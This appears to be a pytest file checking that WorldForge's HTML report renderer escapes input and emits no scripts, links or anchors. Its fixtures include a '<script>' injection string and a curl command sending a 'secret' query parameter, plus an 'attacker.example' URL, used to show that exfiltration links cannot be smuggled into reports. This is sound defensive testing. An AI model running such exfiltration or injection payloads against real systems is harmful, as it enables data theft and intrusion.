"""Tests for static HTML export of WorldForge run artifacts (WF-FEAT-009)."""

from __future__ import annotations

import re
import sys
from pathlib import Path

import pytest

from worldforge import WorldForge, WorldForgeError
from worldforge.cli import main as worldforge_main
from worldforge.evaluation.suites import EvaluationSuite
from worldforge.html_report import (
    HTML_REPORT_SCHEMA_VERSION,
    render_benchmark_html,
    render_comparison_html,
    render_evaluation_html,
    render_evidence_bundle_html,
    render_issue_bundle_html,
)


def _eval_report(tmp_path: Path):
    suite = EvaluationSuite.from_builtin("planning")
    forge = WorldForge(state_dir=tmp_path, auto_register_remote=False)
    return suite.run_report(["mock"], forge=forge)


def _benchmark_report(tmp_path: Path):
    from worldforge.benchmark import ProviderBenchmarkHarness

    forge = WorldForge(state_dir=tmp_path, auto_register_remote=False)
    harness = ProviderBenchmarkHarness(forge=forge)
    return harness.run(["mock"], operations=["predict"], iterations=2, concurrency=1)


def test_html_schema_version_is_exposed() -> None:
    assert HTML_REPORT_SCHEMA_VERSION == 1


def test_render_evaluation_html_is_self_contained(tmp_path: Path) -> None:
    report = _eval_report(tmp_path)
    html = report.to_html()

    assert html.startswith("<!DOCTYPE html>")
    assert "<title>WorldForge Evaluation Report" in html
    assert "<style>" in html
    # No external references — no <script>, no <link rel="stylesheet">, no remote URLs.
    assert "<script" not in html
    assert "<link" not in html
    assert "http://" not in html
    assert "https://" not in html
    assert "<table>" in html
    assert "Provider Summaries" in html
    assert "Scenario Results" in html


def test_render_evaluation_html_escapes_provider_names(tmp_path: Path) -> None:
    forge = WorldForge(state_dir=tmp_path, auto_register_remote=False)
    from worldforge.providers import MockProvider

    forge.register_provider(MockProvider(name="<script>"))
    suite = EvaluationSuite.from_builtin("planning")
    report = suite.run_report(["<script>"], forge=forge)

    html = render_evaluation_html(report)

    assert "<script>" not in html  # nothing slipped through unescaped
    assert "&lt;script&gt;" in html


def test_render_benchmark_html_contains_results_table(tmp_path: Path) -> None:
    report = _benchmark_report(tmp_path)
    html = report.to_html()

    assert html.startswith("<!DOCTYPE html>")
    assert "<title>WorldForge Benchmark Report</title>" in html
    assert "Throughput" in html
    assert "<table>" in html
    assert "<script" not in html


def test_render_benchmark_html_handles_empty_results() -> None:
    from worldforge.benchmark import BenchmarkReport

    report = BenchmarkReport(results=[])
    html = render_benchmark_html(report)
    assert html.startswith("<!DOCTYPE html>")
    # When there are no rows, the table renders a placeholder row of dashes.
    assert html.count("<tr>") >= 2


def test_render_comparison_html_renders_runs_and_rows() -> None:
    payload = {
        "schema_version": 2,
        "kind": "benchmark",
        "baseline_run_id": "20260101T000000Z-00000001",
        "run_count": 2,
        "claim_boundary": "Comparison limited to deterministic mock results.",
        "runs": [
            {
                "run_id": "20260101T000000Z-00000001",
                "created_at": "2026-01-01T00:00:00Z",
                "status": "completed",
                "provider": "mock",
                "operation": "predict",
                "command": "worldforge benchmark --provider mock",
            },
            {
                "run_id": "20260102T000000Z-00000002",
                "created_at": "2026-01-02T00:00:00Z",
                "status": "completed",
                "provider": "mock",
                "operation": "predict",
                "command": "worldforge benchmark --provider mock",
            },
        ],
        "rows": [
            {"provider": "mock", "operation": "predict", "ok": "5/5"},
            {"provider": "mock", "operation": "predict", "ok": "5/5"},
        ],
    }
    html = render_comparison_html(payload)

    assert html.startswith("<!DOCTYPE html>")
    assert "WorldForge Run Comparison" in html
    assert "20260101T000000Z-00000001" in html
    assert "Runs" in html
    assert "Comparison Rows" in html


def test_render_comparison_html_rejects_non_dict_payload() -> None:
    with pytest.raises(WorldForgeError, match="JSON object"):
        render_comparison_html(["not", "a", "dict"])  # type: ignore[arg-type]


def test_render_evidence_bundle_html_exposes_safety_signals() -> None:
    manifest = {
        "schema_version": 1,
        "generated_at": "2026-05-06T12:00:00Z",
        "source_workspace": ".worldforge",
        "run_count": 1,
        "included_count": 3,
        "excluded_count": 0,
        "safe_to_attach": True,
        "runs": [
            {
                "run_id": "20260101T000000Z-00000001",
                "kind": "eval",
                "status": "completed",
                "provider": "mock",
                "operation": "planning",
                "command": "worldforge eval --suite planning",
                "skip_reason": None,
            }
        ],
        "files": [
            {
                "path": "runs/20260101T000000Z-00000001/reports/report.json",
                "included": True,
                "safe_to_attach": True,
                "sha256": "sha256:abc",
                "reason": None,
            }
        ],
        "fixture_digests": [{"path": "fixtures/predict/sample.json", "sha256": "sha256:def"}],
    }
    html = render_evidence_bundle_html(manifest)

    assert html.startswith("<!DOCTYPE html>")
    assert "Safe to attach" in html
    assert "20260101T000000Z-00000001" in html
    assert "fixtures/predict/sample.json" in html
    assert "<script" not in html


def test_render_issue_bundle_html_warns_when_unsafe() -> None:
    manifest = {
        "schema_version": 1,
        "bundle_kind": "issue-run",
        "safe_to_attach": False,
        "first_triage_step": "Inspect the failed scenario",
        "runs": [
            {
                "run_id": "20260101T000000Z-00000001",
                "command": "worldforge eval --suite planning",
                "expected_signal": "all-pass",
                "observed_failure": "scenario X failed",
                "validation_errors": ["budget exceeded"],
            }
        ],
        "files": [
            {
                "path": "runs/.../reports/report.json",
                "included": True,
                "safe_to_attach": False,
                "reason": "exceeds size threshold",
            }
        ],
    }
    html = render_issue_bundle_html(manifest)

    assert "20260101T000000Z-00000001" in html
    assert "Validation Errors" in html
    assert "budget exceeded" in html
    assert "Warning:" in html  # unsafe banner present


def test_render_issue_bundle_html_safe_path_omits_warning() -> None:
    manifest = {
        "safe_to_attach": True,
        "runs": [{"run_id": "r1", "command": "x"}],
        "files": [],
    }
    html = render_issue_bundle_html(manifest)
    assert "Warning:" not in html


def test_render_issue_bundle_html_rejects_non_dict() -> None:
    with pytest.raises(WorldForgeError, match="JSON object"):
        render_issue_bundle_html("not-a-dict")  # type: ignore[arg-type]


def test_render_evidence_bundle_html_rejects_non_dict() -> None:
    with pytest.raises(WorldForgeError, match="JSON object"):
        render_evidence_bundle_html("not-a-dict")  # type: ignore[arg-type]


def test_html_table_escapes_html_special_characters() -> None:
    payload = {
        "schema_version": 2,
        "kind": "benchmark",
        "baseline_run_id": "<root>",
        "run_count": 1,
        "runs": [
            {
                "run_id": "<x>",
                "created_at": "2026-01-01",
                "status": "ok",
                "provider": "p&l",
                "operation": "<predict>",
                "command": 'echo "<bad>"',
            }
        ],
        "rows": [{"a": "<b>"}],
    }
    html = render_comparison_html(payload)

    # All angle brackets in user-supplied fields are escaped.
    assert "<x>" not in html
    assert "&lt;x&gt;" in html
    assert "p&amp;l" in html
    assert "&lt;predict&gt;" in html
    assert "&quot;&lt;bad&gt;&quot;" in html


def test_html_output_has_no_anchor_tags(tmp_path: Path) -> None:
    """The HTML renderer never emits <a href=...> elements; URLs become plain text.

    This keeps the output safe-to-attach by default — a malformed manifest cannot
    smuggle an exfiltration link into a rendered report.
    """

    manifest = {
        "schema_version": 1,
        "safe_to_attach": True,
        "runs": [
            {
                "run_id": "r1",
                "command": "curl https://example.com/?secret=leak",
                "expected_signal": "see https://example.com",
                "observed_failure": "https://attacker.example/x",
            }
        ],
        "files": [],
    }
    html = render_issue_bundle_html(manifest)

    assert re.search(r"<a\s", html) is None
    assert "href=" not in html


def test_eval_cli_html_format(tmp_path: Path, monkeypatch, capsys) -> None:
    monkeypatch.setattr(
        sys,
        "argv",
        [
            "worldforge",
            "eval",
            "--suite",
            "planning",
            "--provider",
            "mock",
            "--state-dir",
            str(tmp_path),
            "--format",
            "html",
        ],
    )
    assert worldforge_main() == 0
    output = capsys.readouterr().out
    assert output.startswith("<!DOCTYPE html>")
    assert "<title>WorldForge Evaluation Report" in output


def test_benchmark_cli_html_format(tmp_path: Path, monkeypatch, capsys) -> None:
    monkeypatch.setattr(
        sys,
        "argv",
        [
            "worldforge",
            "benchmark",
            "--provider",
            "mock",
            "--operation",
            "predict",
            "--iterations",
            "1",
            "--state-dir",
            str(tmp_path),
            "--format",
            "html",
        ],
    )
    assert worldforge_main() == 0
    output = capsys.readouterr().out
    assert output.startswith("<!DOCTYPE html>")
    assert "WorldForge Benchmark Report" in output


def test_eval_artifacts_includes_html_key(tmp_path: Path) -> None:
    report = _eval_report(tmp_path)
    artifacts = report.artifacts()
    assert set(artifacts).issuperset({"json", "markdown", "csv", "html"})
    assert artifacts["html"].startswith("<!DOCTYPE html>")


def test_benchmark_artifacts_includes_html_key(tmp_path: Path) -> None:
    report = _benchmark_report(tmp_path)
    artifacts = report.artifacts()
    assert set(artifacts).issuperset({"json", "markdown", "csv", "html"})
    assert artifacts["html"].startswith("<!DOCTYPE html>")


def test_comparison_artifact_supports_html() -> None:
    from worldforge.harness.report_compare import comparison_artifact

    payload = {
        "schema_version": 2,
        "kind": "benchmark",
        "baseline_run_id": "r1",
        "run_count": 1,
        "runs": [{"run_id": "r1"}],
        "rows": [{"a": "b"}],
    }
    rendered = comparison_artifact(payload, output_format="html")
    assert rendered.startswith("<!DOCTYPE html>")


def test_comparison_artifact_rejects_unknown_format() -> None:
    from worldforge.harness.report_compare import comparison_artifact

    with pytest.raises(WorldForgeError, match="json, markdown, csv, or html"):
        comparison_artifact({}, output_format="pdf")
